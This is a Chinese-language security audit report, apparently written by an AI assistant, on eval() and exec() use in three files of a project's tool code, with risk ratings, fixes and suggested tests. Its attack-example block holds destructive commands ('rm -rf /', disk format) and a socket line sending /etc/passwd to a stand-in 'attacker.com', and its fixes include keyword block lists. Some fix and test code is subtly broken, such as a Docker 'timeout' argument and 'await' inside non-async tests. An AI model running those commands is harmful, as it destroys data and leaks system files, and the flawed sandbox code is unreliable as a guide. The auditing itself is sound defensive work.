# 代码注入安全审计报告

## 执行日期
2026-03-17

## 审计范围
弥娅项目中的 `eval()` 和 `exec()` 使用情况

---

## 发现的安全风险

### 🔴 高风险: `webnet/ToolNet/tools/basic/python_interpreter.py`

**位置**: Line 66
```python
exec(code, {'__name__': '__main__'})
```

**风险等级**: 🔴 高

**风险描述**:
- 直接执行用户提供的Python代码
- 无输入验证和过滤
- 无沙箱隔离
- 可能导致任意代码执行

**潜在攻击**:
```python
# 恶意代码示例
import os
os.system('rm -rf /')  # 删除所有文件

import subprocess
subprocess.run(['format', 'C:'])  # 格式化磁盘

# 窃取数据
import socket
s = socket.socket()
s.connect(('attacker.com', 12345))
s.send(open('/etc/passwd').read())
```

**修复方案**:

**方案1: 使用Docker容器隔离** (推荐)
```python
import docker
import tempfile
from pathlib import Path

class PythonInterpreter(BaseTool):
    async def execute(self, args: Dict[str, Any], context: ToolContext) -> str:
        code = args.get("code", "")
        
        # 创建临时脚本文件
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(code)
            script_path = f.name
        
        try:
            # 使用Docker容器执行
            client = docker.from_env()
            
            # 限制资源: 1核CPU, 512MB内存, 30秒超时
            container = client.containers.run(
                image='python:3.11-slim',
                command=f'python /app/script.py',
                volumes={script_path: {'bind': '/app/script.py', 'mode': 'ro'}},
                cpu_quota=100000,  # 1核
                mem_limit='512m',  # 512MB内存
                network_disabled=True,  # 禁用网络
                timeout=30,  # 30秒超时
                remove=True,  # 执行后删除容器
                stdout=True,
                stderr=True
            )
            
            return f"执行结果:\n{container.decode('utf-8')}"
            
        except Exception as e:
            return f"执行错误: {str(e)}"
        finally:
            # 删除临时文件
            Path(script_path).unlink(missing_ok=True)
```

**方案2: 使用RestrictedPython** (推荐)
```python
import RestrictedPython
from RestrictedPython import compile_restricted
from RestrictedPython.Guards import safe_builtins

class PythonInterpreter(BaseTool):
    async def execute(self, args: Dict[str, Any], context: ToolContext) -> str:
        code = args.get("code", "")
        
        # 限制可用的内置函数
        restricted_globals = {
            '__builtins__': safe_builtins,
            '__name__': '__main__',
            'print': print,
            'len': len,
            'range': range,
            'str': str,
            'int': int,
            'float': float,
            'list': list,
            'dict': dict,
            # 明确禁用的模块
            'os': None,
            'sys': None,
            'subprocess': None,
            'importlib': None,
        }
        
        # 编译为受限代码
        compiled_code = compile_restricted(code, filename="<string>", mode="exec")
        
        if compiled_code.errors:
            return f"代码包含不安全的操作: {compiled_code.errors}"
        
        # 执行受限代码
        try:
            exec(compiled_code.code, restricted_globals)
            return "代码执行完成"
        except Exception as e:
            return f"执行错误: {str(e)}"
```

**方案3: 使用白名单验证** (最低要求)
```python
import ast
import re

class PythonInterpreter(BaseTool):
    async def execute(self, args: Dict[str, Any], context: ToolContext) -> str:
        code = args.get("code", "")
        
        # 黑名单检查
        blacklisted = [
            'import', 'exec', 'eval', 'open', 'file',
            'os.', 'sys.', 'subprocess', 'socket',
            '__import__', 'getattr', 'setattr',
        ]
        
        for keyword in blacklisted:
            if keyword in code:
                return f"错误: 代码包含不允许的关键词 '{keyword}'"
        
        # 检查危险函数调用
        dangerous_functions = [
            r'eval\s*\(',
            r'exec\s*\(',
            r'compile\s*\(',
            r'__import__\s*\(',
        ]
        
        for pattern in dangerous_functions:
            if re.search(pattern, code):
                return f"错误: 代码包含不允许的函数 '{pattern}'"
        
        # 限制代码长度
        if len(code) > 1000:
            return "错误: 代码过长,最多1000字符"
        
        # 限制执行时间
        import signal
        
        def timeout_handler(signum, frame):
            raise TimeoutError("代码执行超时")
        
        signal.signal(signal.SIGALRM, timeout_handler)
        signal.alarm(5)  # 5秒超时
        
        try:
            exec(code, {'__name__': '__main__'})
            return "代码执行完成"
        except TimeoutError:
            return "错误: 代码执行超时"
        except Exception as e:
            return f"执行错误: {str(e)}"
        finally:
            signal.alarm(0)  # 取消超时
```

---

### 🟡 中风险: `webnet/ToolNet/tools/development/database_migrator.py`

**位置**: Line 195
```python
col_type = eval(col_def['type'])
```

**风险等级**: 🟡 中

**风险描述**:
- 从配置中读取类型并eval
- 配置可能被篡改
- 可能导致任意代码执行

**修复方案**:

```python
from sqlalchemy import (
    String, Integer, Float, Boolean, 
    DateTime, Date, Time, Text, Binary,
    LargeBinary, Numeric
)

# 类型映射表
TYPE_MAPPING = {
    'String': String,
    'Integer': Integer,
    'Float': Float,
    'Boolean': Boolean,
    'DateTime': DateTime,
    'Date': Date,
    'Time': Time,
    'Text': Text,
    'Binary': Binary,
    'LargeBinary': LargeBinary,
    'Numeric': Numeric,
}

def get_column_type(type_str: str, **kwargs):
    """安全地获取SQLAlchemy列类型"""
    type_name = type_str.split('(')[0] if '(' in type_str else type_str
    
    if type_name not in TYPE_MAPPING:
        raise ValueError(f"不支持的列类型: {type_name}")
    
    type_class = TYPE_MAPPING[type_name]
    
    # 处理类型参数
    if '(' in type_str:
        import re
        params = re.search(r'\((.*?)\)', type_str).group(1)
        return type_class(*map(int, params.split(',')))
    
    return type_class

# 使用示例
col_type = get_column_type(
    col_def['type'],
    length=col_def.get('length'),
    precision=col_def.get('precision'),
    scale=col_def.get('scale')
)
```

---

### 🟢 低风险: `webnet/ToolNet/tools/office/excel_processor.py`

**位置**: Line 266
```python
result_df[new_col_name] = result_df.eval(expr)
```

**风险等级**: 🟢 低

**风险描述**:
- pandas.eval() 是相对安全的
- 仅支持表达式,不支持语句
- 但仍需注意输入验证

**修复方案**:

```python
def add_calculated_column(
    self,
    df: pd.DataFrame,
    formula: str,
    new_col_name: str,
    columns_map: Dict[str, str] = None
) -> pd.DataFrame:
    """安全地添加计算列"""
    
    # 验证表达式
    # 只允许基本的数学运算
    allowed_pattern = r'^[\w\s+\-*/%()\.]+$'
    if not re.match(allowed_pattern, formula):
        raise ValueError(f"无效的计算公式: {formula}")
    
    # 黑名单检查
    blacklisted_keywords = ['import', 'exec', 'eval', '__', 'lambda']
    for keyword in blacklisted_keywords:
        if keyword in formula:
            raise ValueError(f"公式包含不允许的关键词: {keyword}")
    
    # 使用pandas.eval()的安全模式
    result_df = df.copy()
    
    try:
        # 替换列名
        expr = formula
        if columns_map:
            for eng_name, chn_name in columns_map.items():
                expr = expr.replace(eng_name, chn_name)
        
        # 安全计算
        result_df[new_col_name] = result_df.eval(expr, engine='python', parser='pandas')
        
        return result_df
        
    except Exception as e:
        logger.error(f"添加计算列失败: {e}")
        raise
```

---

## 统计汇总

| 风险等级 | 文件数 | 位置数 | 优先级 |
|---------|--------|--------|--------|
| 🔴 高 | 1 | 1 | P0 |
| 🟡 中 | 1 | 1 | P1 |
| 🟢 低 | 1 | 1 | P2 |

---

## 修复优先级

### P0 (立即修复)
1. ✅ `webnet/ToolNet/tools/basic/python_interpreter.py` - Line 66

### P1 (1周内修复)
2. `webnet/ToolNet/tools/development/database_migrator.py` - Line 195

### P2 (1月内修复)
3. `webnet/ToolNet/tools/office/excel_processor.py` - Line 266

---

## 安全加固建议

### 1. 代码审查流程
- ✅ 所有新代码必须经过安全审查
- ✅ 禁止使用eval/exec,除非有明确的安全措施
- ✅ 使用静态分析工具扫描代码

### 2. 依赖管理
- ✅ 使用 `pip-audit` 扫描依赖漏洞
- ✅ 定期更新依赖包
- ✅ 使用固定版本号

### 3. 运行时保护
- ✅ 使用沙箱环境隔离用户代码
- ✅ 限制资源使用(CPU/内存/网络)
- ✅ 设置超时机制
- ✅ 记录所有代码执行日志

### 4. 监控和告警
- ✅ 监控异常的代码执行行为
- ✅ 设置告警规则
- ✅ 定期审计执行日志

---

## 测试建议

### 安全测试用例

```python
import pytest
from webnet.ToolNet.tools.basic.python_interpreter import PythonInterpreter

def test_safe_code_execution():
    """测试安全代码执行"""
    interpreter = PythonInterpreter()
    
    # 测试正常代码
    result = await interpreter.execute({"code": "print('Hello')"}, None)
    assert "Hello" in result
    
    # 测试数学计算
    result = await interpreter.execute({"code": "print(2 + 2)"}, None)
    assert "4" in result

def test_dangerous_code_rejection():
    """测试危险代码被拒绝"""
    interpreter = PythonInterpreter()
    
    # 测试import被拒绝
    result = await interpreter.execute({"code": "import os"}, None)
    assert "错误" in result or "不允许" in result
    
    # 测试文件操作被拒绝
    result = await interpreter.execute({"code": "open('/etc/passwd')"}, None)
    assert "错误" in result or "不允许" in result
    
    # 测试代码注入被拒绝
    result = await interpreter.execute({"code": "__import__('os').system('ls')"}, None)
    assert "错误" in result or "不允许" in result

def test_resource_limits():
    """测试资源限制"""
    interpreter = PythonInterpreter()
    
    # 测试超时
    result = await interpreter.execute({
        "code": "while True: pass",
        "timeout": 2
    }, None)
    assert "超时" in result
    
    # 测试内存限制(通过大列表)
    result = await interpreter.execute({
        "code": "x = [0] * 10000000"  # 80MB+
    }, None)
    assert "错误" in result or "内存" in result
```

---

## 相关资源

### 静态分析工具
- [Bandit](https://bandit.readthedocs.io/) - Python安全扫描工具
- [Pylint](https://pylint.org/) - 代码质量检查
- [Safety](https://github.com/pyupio/safety) - 依赖漏洞扫描

### 安全框架
- [RestrictedPython](https://restrictedpython.readthedocs.io/) - 受限Python执行环境
- [PyPy sandbox](https://doc.pypy.org/en/latest/sandbox.html) - PyPy沙箱
- [Docker](https://www.docker.com/) - 容器隔离

### 文档
- [Python安全最佳实践](https://python.readthedocs.io/en/stable/library/security_warnings.html)
- [OWASP Python安全指南](https://cheatsheetseries.owasp.org/cheatsheets/Python_Security_Cheat_Sheet.html)

---

## 联系方式

如有安全问题或建议,请联系:
- 项目仓库 Issues
- 安全负责人邮箱

---

**最后更新**: 2026-03-17  
**审计人员**: AI Assistant  
**审核状态**: 待审核
